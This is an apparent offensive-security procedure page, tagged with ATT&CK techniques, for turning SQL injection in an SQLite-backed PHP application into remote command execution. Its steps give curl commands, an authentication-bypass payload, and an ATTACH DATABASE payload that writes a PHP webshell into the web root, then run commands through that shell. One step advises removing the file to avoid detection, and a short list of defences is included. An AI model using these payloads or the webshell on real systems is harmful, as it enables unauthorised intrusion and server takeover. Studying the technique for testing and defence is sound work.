---
id: b0bf3c7b-c5f1-430e-9b35-8d7ab5ddcba5
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.151960+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/Command and Scripting
    Interpreter: Unix Shell|T1059.004 - Command and Scripting Interpreter: Unix
    Shell]]
tags:
  - '[[tags/SQLite Injection]]'
  - '[[tags/Remote Command Execution]]'
  - '[[tags/Web Shell]]'
commands:
  - '[[commands/curl-send-sqlite-injection-payload]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# SQLite-Injection-for-RCE-via-Attach-Database

## Summary

This procedure demonstrates a SQL injection attack against an SQLite-backed web application to achieve remote command execution (RCE). By exploiting a vulnerable input parameter, an attacker injects a specially crafted SQL payload using the ATTACH DATABASE command to attach a new database file in a web-accessible directory (e.g., as a PHP file) and inserts PHP code that creates a simple webshell. Once injected, the attacker can execute arbitrary OS commands via HTTP requests to the created file.

## Description

SQLite injection targets applications using SQLite as the database backend, where user inputs are not properly sanitized, allowing attackers to inject malicious SQL. This specific technique leverages the ATTACH DATABASE command to link an external file (e.g., /var/www/lol.php) as a database, then creates a table and inserts PHP code into it. The PHP code uses the system() function to execute commands passed via a 'cmd' GET parameter, effectively creating a webshell. This bypasses application controls and grants OS-level execution on the server, assuming the web server process has write access to the target directory and PHP execution privileges. The attack is realistic against legacy or poorly secured web apps, such as those built with PHP and SQLite on Linux servers. Success leads to command execution, data exfiltration, or further persistence.

## Requirements

1. Network access to a web application vulnerable to SQL injection in an SQLite query (e.g., via a form parameter like 'username' or 'id').
2. Knowledge of the injection point, confirmed via error-based or union-based SQLi testing.
3. Write access to a web server directory (e.g., /var/www/) from the database context (common if the app runs as www-data).
4. PHP enabled on the web server to execute the injected code.
5. Tools like curl for sending HTTP requests (no special software required beyond a browser or terminal).

## Defense

- Implement parameterized queries or prepared statements in the application code to prevent SQL injection.
- Validate and sanitize all user inputs, rejecting suspicious characters like quotes or semicolons.
- Deploy a Web Application Firewall (WAF) to detect and block injection attempts.
- Run the web server with least privilege, restricting write access to directories outside the document root.
- Monitor for anomalous file creations in web directories and unexpected PHP executions via logs (e.g., access.log, error.log).
- Use database abstractions that escape inputs automatically.

## Objectives

1. Exploit SQL injection to write a PHP webshell file using SQLite's ATTACH DATABASE.
2. Achieve remote command execution on the target server via the webshell.
3. Verify RCE by running diagnostic commands like 'id' or 'whoami'.

## Instructions

### Step 1: Confirm SQL Injection Vulnerability

**Context**: Identify and validate an injectable parameter in the web application, such as a login form or search field, to ensure the SQLite backend is accessible and errors are verbose enough to craft the payload.

**Command** ([[commands/curl-send-sqlite-injection-payload]]):
```bash
curl -X POST http://target.com/vulnerable.php -d "username=admin' OR 1=1--" -v
```

> This sends a basic tautology-based injection to bypass authentication or retrieve data. Look for database errors mentioning SQLite or unexpected results indicating injection success. Adjust the endpoint and parameter based on reconnaissance.

### Step 2: Craft the Injection Payload

**Context**: Prepare the SQL payload to attach a database file as a PHP webshell. Use the provided code snippet to create the malicious query, replacing placeholders like the file path if needed.

**Code** ([[codes/SQLite-Attach-Database-to-Create-PHP-Webshell]]):
```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

> The payload attaches '/var/www/lol.php' as a database alias 'lol', creates a table 'pwn', and inserts PHP code that executes system commands from the 'cmd' GET parameter. The trailing '--' comments out the rest of the original query to avoid syntax errors.

### Step 3: Inject the Payload

**Context**: Deliver the crafted SQL payload through the vulnerable parameter to execute the ATTACH and INSERT commands on the server.

**Command** ([[commands/curl-send-sqlite-injection-payload]]):
```bash
curl -X POST http://target.com/vulnerable.php -d "username=admin'; [PASTE_FULL_PAYLOAD_HERE]" -v
```

> Replace [PASTE_FULL_PAYLOAD_HERE] with the SQL code from Step 2, URL-encoded if necessary (e.g., use %27 for '). Send the request and check the response for SQLite errors or success indicators like no syntax issues. If successful, the file /var/www/lol.php will be created with the PHP webshell.

### Step 4: Verify and Execute Commands via Webshell

**Context**: Access the injected PHP file to confirm RCE and run commands. This step validates the attack and allows further exploitation.

**Command** ([[commands/curl-send-sqlite-injection-payload]]):
```bash
curl "http://target.com/lol.php?cmd=id"
```

> This executes 'id' via the webshell. Expected output shows user/group info (e.g., uid=33(www-data)). If it works, try other commands like 'whoami' or 'ls /'. Clean up by deleting the file post-testing to avoid detection.
